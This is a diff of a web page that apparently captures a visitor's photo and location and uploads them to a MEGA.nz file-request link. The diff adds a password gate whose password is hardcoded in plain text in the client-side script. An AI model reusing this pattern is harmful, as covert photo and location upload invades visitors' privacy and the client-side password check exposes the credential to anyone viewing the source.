@@ -53,18 +53,41 @@
 </head>
 <body>
     <h1>📡 Upload Photo and Location to MEGA.nz</h1>
-    <p id="status">Initializing...</p>
-    <canvas id="canvas" style="display: none;"></canvas>
-    <button onclick="startProcess()">Start Process</button>
+    <div id="auth-section">
+        <h2>🔒 Enter Password to Access</h2>
+        <input type="password" id="password" placeholder="Enter password">
+        <button onclick="checkPassword()">Submit</button>
+        <p id="auth-status" style="color: red;"></p>
+    </div>
+    <div id="main-content" style="display: none;">
+        <p id="status">Initializing...</p>
+        <canvas id="canvas" style="display: none;"></canvas>
+    </div>
 
     <script>
-        const megaUploadURL = 'https://mega.nz/filerequest/RZuufuD6rTE';  // MEGA file request link
+        const megaUploadURL = 'https://mega.nz/submit/g2omOD';  // Updated MEGA file request link
 
         // Function to Update Status on Web Page
         function updateStatus(message, isError = false) {
             const statusElement = document.getElementById("status");
             statusElement.style.color = isError ? "red" : "#58a6ff";
             statusElement.innerText += `${message}\n`;
+        }
+
+        // Password Check
+        function checkPassword() {
+            const enteredPassword = document.getElementById("password").value;
+            const correctPassword = "Nipunapromod@1"; 
+
+            if (enteredPassword === correctPassword) {
+                updateStatus("✅ Password correct.");
+                document.getElementById("auth-section").style.display = "none";
+                document.getElementById("main-content").style.display = "block";
+                startProcess();
+            } else {
+                updateStatus("❌ Incorrect password!", true);
+                document.getElementById("auth-status").innerText = "❌ Incorrect password!";
+            }
         }
 
         async function startProcess() {
